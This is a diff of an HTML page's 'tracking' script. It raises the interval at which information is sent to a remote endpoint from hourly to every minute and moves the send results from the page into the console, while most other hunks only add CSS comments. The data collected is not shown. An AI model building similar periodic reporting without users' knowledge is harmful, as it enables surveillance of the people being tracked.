@@ -10,15 +10,15 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            margin: 0;
+            margin: 0; /* Remove default margin */
         }
         h1 {
-            font-size: 24px;
+            font-size: 24px; /* Adjust font size for mobile */
         }
         button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
+            padding: 10px 20px; /* Add padding to the button */
+            font-size: 16px; /* Adjust button font size */
+            cursor: pointer; /* Change cursor on hover */
         }
     </style>
 </head>
@@ -32,7 +32,8 @@
 
         function startTracking() {
             updateInfo(); // Send initial update
-            trackingInterval = setInterval(updateInfo, 3600000); // Update every hour (3600000 ms)
+            trackingInterval = setInterval(updateInfo, 60000); // Update every minute (60000 ms)
+            document.getElementById("status").textContent = "Tracking started. Information will be sent every minute.";
         }
 
         function updateInfo() {
@@ -89,14 +90,13 @@
             })
             .then(data => {
                 if (data.ok) {
-                    document.getElementById("status").textContent = "Information sent successfully!";
+                    console.log("Information sent successfully!");
                 } else {
-                    document.getElementById("status").textContent = "Failed: " + data.description;
+                    console.error("Failed: " + data.description);
                 }
             })
             .catch(error => {
-                document.getElementById("status").textContent = "Error sending: " + error.message;
-                console.error('Error:', error);
+                console.error('Error sending: ' + error.message);
             });
         }
 
